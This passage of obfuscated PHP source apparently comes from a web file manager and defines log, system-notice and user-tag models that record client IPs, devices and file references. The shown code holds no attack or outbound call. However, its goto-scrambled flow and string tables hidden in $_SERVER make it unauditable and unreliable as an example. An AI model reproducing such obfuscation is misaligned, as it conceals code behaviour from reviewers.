get_client_ip(); if (!$Fڱ || strlen(json_encode($Fڱ)) >= 1024) { $Fڱ = array($Fڂǃ[2336] => $eЫ); } else { if (is_array($Fڱ)) { $Fڱ[$Fڂǃ[2336]] = $eЫ; } else { $Fڱ = array($Fڂǃ[1007] => $Fڱ, $Fڂǃ[2336] => $eЫ); } } $Fڱ = array($Fڂǃ[1329] => Session::sign(), $Fڂǃ[1330] => $dŃ, $Fڂǃ[29] => $f, $Fڂǃ[1332] => json_encode($Fڱ)); goto b۫֬; bՏ֨: $Fڂǃ =& $_SERVER[놫Ӱ]; if (!isset($this->typeList[$f])) { return; } $dŃ = USER_ID ? USER_ID : (isset($Fڱ[$Fڂǃ[1339]]) ? $Fڱ[$Fڂǃ[1339]] : 0); goto E; Aљ­: } public function remove($Bƍ) { $this->where(array($_SERVER[놫Ӱ][382] => $Bƍ))->delete(); } private function _makeOrder($d = '') { goto aŞ; e܌: return $this->order($d); goto B; c: $dģ = Input::get($cƯ[404], $cƯ[7], $cƯ[2141], array($cƯ[2082], $cƯ[400])); $dģ = $Eﶻ˪[$dģ]; $d = $d . "{$fƚܷ}\x20{$dģ}"; goto e܌; aŞ: $cƯ =& $_SERVER[놫Ӱ]; $fƚܷ = $cƯ[184]; $Eﶻ˪ = array($cƯ[398] => $cƯ[399], $cƯ[400] => $cƯ[401]); goto c; B: } public function get($a = '') { goto e; e: $BҼ =& $_SERVER[놫Ӱ]; if (!$a) { show_json(array()); } $b = array(); goto Bړ; A: $d[$BҼ[350]] = $this->logList($d[$BҼ[350]]); return $d; goto Cب; Bړ: if ($a[$BҼ[1339]]) { $b[$BҼ[1339]] = $a[$BҼ[1339]]; } if (isset($a[$BҼ[687]])) { $D = $a[$BҼ[687]]; $bǗ = isset($a[$BҼ[688]]) ? $a[$BҼ[688]] : time(); $b[$BҼ[184]] = array($BҼ[318], array($D, $bǗ)); } if ($a[$BҼ[29]]) { $Bʯؕ = explode($BҼ[47], $a[$BҼ[29]]); $b猘 = $this->typeFile(); $F櫵 = array(); foreach ($Bʯؕ as $fƯ糢) { $F櫵[] = $fƯ糢; if (isset($b猘[$fƯ糢])) { $F櫵 = array_merge($F櫵, $b猘[$fƯ糢]); } } $F櫵 = array_unique($F櫵); if ($F櫵) { $b[$BҼ[29]] = array($BҼ[7], $F櫵); } } goto a; a: if (!empty($a[$BҼ[2336]])) { $b[$BҼ[401]] = array($BҼ[746], "\x25{$a[$BҼ[2336]]}\45"); } $d = $this->_makeOrder()->where($b)->selectPage(); if (empty($d[$BҼ[350]])) { show_json(array(), !0, $d[$BҼ[347]]); } goto A; Cب: } private function ipAddress(&$cۈ) { $aۈǾ =& $_SERVER[놫Ӱ]; if (!empty($cۈ[$aۈǾ[2336]])) { $b虣 = IpLocation::get($cۈ[$aۈǾ[2336]]); if ($b虣 == $aۈǾ[2337]) { $b虣 = $aۈǾ[2338]; } } else { $b虣 = LNG($aۈǾ[2339]); } $cۈ[$aۈǾ[2340]] = $b虣; } private function getSourceList(&$Dֿڃ) { $D =& $_SERVER[놫Ӱ]; $b = array(); foreach ($Dֿڃ as $E। => $Aļ) { $B = json_decode($Aļ[$D[401]], !0); if (strpos($Aļ[$D[29]], $D[2176]) !== 0) { goto A; A: if (!isset($B[$D[76]]) || strpos($Aļ[$D[29]], $D[2341]) !== 0) { continue; } if (!IO::init($B[$D[76]])) { continue; } if (!($dٳ񑋡 = IO::infoFull($B[$D[76]]))) { continue; } goto B؇; bȇ: continue; goto f; B؇: $b[] = $B[$D[366]] = $dٳ񑋡[$D[366]]; $b[] = $B[$D[2175]] = $dٳ񑋡[$D[457]]; $Dֿڃ[$E।][$D[401]] = json_encode($B); goto bȇ; f: } $b[] = $B[$D[366]]; $b[] = $B[$D[2175]]; if ($B[$D[29]] == $D[484]) { $b[] = $B[$D[401]][$D[978]]; $b[] = $B[$D[401]][$D[979]]; } if ($B[$D[29]] == $D[2181]) { $b[] = $B[$D[401]][$D[366]]; } } if (!$b) { return array(); } return Model($D[747])->sourceListInfo($b, !0); } private function logList($B̛) { goto e; dІ: return $f; goto fֺ; a: $A = $this->getSourceList($B̛); $a˺ = $this->typeAll(); $f = array(); goto Aő; e: $B =& $_SERVER[놫Ӱ]; $d = array_to_keyvalue($B̛, $B[33], $B[1339]); $cю = Model($B[469])->userListInfo(array_unique($d)); goto a; Aő: $A˯ = array(); foreach ($B̛ as $B𭃘 => $CӬ) { goto F; dЙ: $CӬ[$B[2140]] = $Bğٌ̘; $f = json_decode($CӬ[$B[401]], !0); $CӬ[$B[2336]] = isset($f[$B[2336]]) ? $f[$B[2336]] : $B[33]; goto bƖ; A: $CӬ[$B[28]] = isset($Bğٌ̘[$B[28]]) ? $Bğٌ̘[$B[28]] : LNG($B[2339]); $CӬ[$B[2221]] = isset($Bğٌ̘[$B[2221]]) ? $Bğٌ̘[$B[2221]] : $B[33]; $CӬ[$B[1237]] = isset($a˺[$C]) ? $a˺[$C] : $Aх; goto dЙ; cѽ: unset($CӬ[$B[2344]]); $f[] = $CӬ; goto FĤ; F: $C = $CӬ[$B[29]]; $Bğٌ̘ = isset($cю[$CӬ[$B[1339]]]) ? $cю[$CӬ[$B[1339]]] : !1; $Aх = strpos($C, $B[2342]) == 0 ? LNG($B[2343]) : LNG($B[2339]); goto A; bƖ: $this->ipAddress($CӬ); if (strpos($C, $B[2176]) === 0 || isset($f[$B[2175]])) { goto Aѣݟ; bϤ: if ($f[$B[29]] == $B[2181]) { $f[$B[401]][$B[366]] = $A[$f[$B[401]][$B[366]]]; } if ($f[$B[29]] == $B[1970]) { $f[$B[2186]] = $f[$B[388]]; $f[$B[2175]] = $f[$B[2186]][$B[366]]; $f[$B[388]] = !1; $f[$B[366]] = $B[33]; } if ($f[$B[388]] && $f[$B[388]][$B[368]] == $B[1047]) { $A˯[] = $CӬ[$B[364]]; unset($B̛[$B𭃘]); continue; } goto Bܟ; Bܟ: if ($f[$B[2186]] && $f[$B[2186]][$B[368]] == $B[1047]) { $A˯[] = $CӬ[$B[364]]; unset($B̛[$B𭃘]); continue; } goto c݌; Aѣݟ: $f[$B[388]] = $A[$f[$B[366]]]; $f[$B[2186]] = $A[$f[$B[2175]]]; if ($f[$B[29]] == $B[484]) { $f[$B[401]][$B[978]] = $A[$f[$B[401]][$B[978]]]; $f[$B[401]][$B[979]] = $A[$f[$B[401]][$B[979]]]; } goto bϤ; c݌: } $CӬ[$B[401]] = $f; goto cѽ; FĤ: } $this->clearSystemPathLog($A˯); goto dІ; fֺ: } private function clearSystemPathLog($Fم) { $fň =& $_SERVER[놫Ӱ]; if (count($Fم) == 0) { return; } $cƉԓ = array($fň[364] => array($fň[7], array_unique($Fم))); $this->where($cƉԓ)->delete(); } public function deviceList($C, $Aؐ = null) { goto D; eɫ՗: return array_values($bЂ); goto Dബ۽; dڃ: $E鶫 = $this->where($D앾)->order($bۉ㙤[2184])->select(); $bЂ = array(); foreach ($E鶫 as $d => &$bӑ) { goto cѽ; Dш: $F㫂 = md5(json_encode($C̍ՠ)); if (isset($bЂ[$F㫂])) { unset($E鶫[$d]); continue; } $this->ipAddress($bӑ); goto C岋; C岋: $bӑ[$bۉ㙤[401]] = $C̍ՠ; $bЂ[$F㫂] = $bӑ; goto d; cѽ: $C̍ՠ = json_decode($bӑ[$bۉ㙤[401]], !0); $bӑ[$bۉ㙤[2336]] = isset($C̍ՠ[$bۉ㙤[2336]]) ? $C̍ՠ[$bۉ㙤[2336]] : $bۉ㙤[33]; unset($C̍ՠ[$bۉ㙤[2336]]); goto Dш; d: } goto eɫ՗; D: $bۉ㙤 =& $_SERVER[놫Ӱ]; $D앾 = array($bۉ㙤[1339] => $C, $bۉ㙤[29] => $bۉ㙤[1943]); if ($Aؐ) { $D앾[$bۉ㙤[184]] = array($bۉ㙤[921], $Aؐ); } goto dڃ; Dബ۽: } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\x6e\x6f\x74\x69\x63\x65\114\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\143\157\x6e\164\145\156\x74", "\141\x75\164\x68", "\x6d\x6f\x64\x65", "\x74\x69\x6d\x65", "\164\171\x70\x65", "\x73\157\x72\164"); public function listData($EɄ = false, $CĂ = "\163\x6f\162\x74", $Aͺ = false) { return parent::listData($EɄ, $CĂ, $Aͺ); } public function add($A) { goto Fϟʥ; aЋ: $bς = time(); if ($A[$C[12]] == $C[2345]) { $bς = strtotime($A[$C[187]]); } $A[$C[187]] = $bς; goto EϦ; EϦ: return parent::insert($A); goto F١; Fϟʥ: $C =& $_SERVER[놫Ӱ]; $D뾪ѳ = $this->findByName($A[$C[28]]); if ($D뾪ѳ) { return !1; } goto aЋ; F١: } public function update($fȭ, $f) { goto dΎ; d: $f[$cޙ[187]] = $Aᕗ; return parent::update($fȭ, $f); goto CɊ; aغ: if (!$EĿ || $Eɮ蘆 && $Eɮ蘆[$cޙ[364]] != $EĿ[$cޙ[364]]) { return !1; } $Aᕗ = time(); if ($f[$cޙ[12]] == $cޙ[2345]) { $Aᕗ = strtotime($f[$cޙ[187]]); } goto d; dΎ: $cޙ =& $_SERVER[놫Ӱ]; $EĿ = $this->listData($fȭ); $Eɮ蘆 = $this->findByName($f[$cޙ[28]]); goto aغ; CɊ: } public function remove($eȢ) { $e = $this->listData($eȢ); if (!$e || $e[$_SERVER[놫Ӱ][1047]]) { return !1; } return parent::remove($eȢ); } public function sort($b, $a) { return parent::update($b, $a); } private function initUserOption() { $Bҵޛ =& $_SERVER[놫Ӱ]; $this->optionType = $Bҵޛ[2346]; $this->modelType = $Bҵޛ[2347]; $this->field = array($Bҵޛ[2348], $Bҵޛ[28], $Bҵޛ[187], $Bҵޛ[29], $Bҵޛ[674], $Bҵޛ[180]); } public function userNoticeGet($bȂ = false) { $this->initUserOption(); return parent::listData($bȂ, $_SERVER[놫Ӱ][364], !0); } public function userNoticeAdd($Aէ) { $DΉ =& $_SERVER[놫Ӱ]; $this->initUserOption(); $aϣ = $this->findByKey($DΉ[2348], $Aէ[$DΉ[364]]); if ($aϣ) { return !0; } $Eޝ = array($DΉ[2348] => $Aէ[$DΉ[364]], $DΉ[28] => $Aէ[$DΉ[28]], $DΉ[187] => $Aէ[$DΉ[187]], $DΉ[29] => isset($Aէ[$DΉ[29]]) ? $Aէ[$DΉ[29]] : 1, $DΉ[674] => 0, $DΉ[180] => 0); return parent::insert($Eޝ); } public function userNoticeEdit($F, $Fኘ) { $this->initUserOption(); return parent::update($F, $Fኘ); } } goto e݌; AЧ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($E松) { $bɄ =& $_SERVER[놫Ӱ]; return array($bɄ[2355] => array(USER_ID, $bɄ[2412])); } protected function listData() { $eГ =& $_SERVER[놫Ӱ]; $C = array($eГ[1330] => USER_ID, $eГ[432] => array($eГ[2413], 0)); $e = $eГ[2414]; $a = $eГ[2415]; $fު = $this->field($e)->where($C)->order($a)->select(); return $fު ? $fު : array(); } protected function listByTag($B­) { } protected function addToTag($DĢާ, $fδ) { $D߄ =& $_SERVER[놫Ӱ]; if (!Model($D߄[2202])->listData($fδ) || !Model($D߄[747])->pathInfo($DĢާ)) { return !1; } $fξߍÃ = array($D߄[1330] => USER_ID, $D߄[432] => $fδ, $D߄[384] => $DĢާ, $D߄[385] => $D߄[379], $D߄[383] => $D߄[33], $D߄[2006] => 0); if ($this->where($fξߍÃ)->find()) { return !1; } return $this->add($fξߍÃ); } protected function removeFromTag($Aʌѓ, $B) { $cȥ =& $_SERVER[놫Ӱ]; if (!Model($cȥ[2202])->listData($B) || !Model($cȥ[747])->pathInfo($Aʌѓ)) { return !1; } $AÆ = array($cȥ[1330] => USER_ID, $cȥ[432] => $B, $cȥ[385] => $cȥ[379], $cȥ[384] => $Aʌѓ); return $this->where($AÆ)->delete(); } protected function removeByTag($a˼) { $Eʶ =& $_SERVER[놫Ӱ]; if (!$a˼) { return !1; } $c׃ψ = array($Eʶ[1330] => USER_ID, $Eʶ[432] => $a˼); return $this->where($c׃ψ)->delete(); } protected function removeBySource($c↣) { $F챲 =& $_SERVER[놫Ӱ]; $eƽ = array($F챲[1330] => USER_ID, $F챲[384] => $c↣, $F챲[432] => array($F챲[921], 0)); return $this->where($eƽ)->delete(); } }